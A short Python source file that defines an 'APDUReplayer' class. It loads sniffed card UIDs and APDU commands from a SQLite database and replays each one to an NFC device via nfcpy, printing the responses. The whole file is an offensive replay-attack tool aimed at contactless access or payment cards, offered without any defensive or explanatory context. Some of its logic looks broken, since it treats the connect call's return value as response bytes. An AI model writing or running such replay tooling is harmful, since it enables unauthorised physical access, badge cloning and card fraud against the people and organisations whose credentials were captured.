import nfc
import sqlite3
from datetime import datetime

class APDUReplayer:
	def __init__(self, db_file="sniffed_cards.db", maxiprox_device="usb"):
		self.db_file = db_file
		self.device = maxiprox_device

	def replay_all(self):
		data = self._retrieve_sniffed_data()
		with nfc.ContactlessFrontend(self.device) as clf:
			for entry in data:
				apdu = bytes.fromhex(entry["apdu_request"])
				print(f"Replaying APDU: {apdu.hex()} for UID {entry['uid']}")
				response = clf.connect(rdwr={"on-connect": lambda tag: tag.exchange(apdu)})
				print(f"Response: {response.hex()}")

	def _retrieve_sniffed_data(self):
		conn = sqlite3.connect(self.db_file)
		cursor = conn.cursor()
		cursor.execute("SELECT uid, apdu_request FROM sniffed_data")
		data = [{"uid": row[0], "apdu_request": row[1]} for row in cursor.fetchall()]
		conn.close()
		return data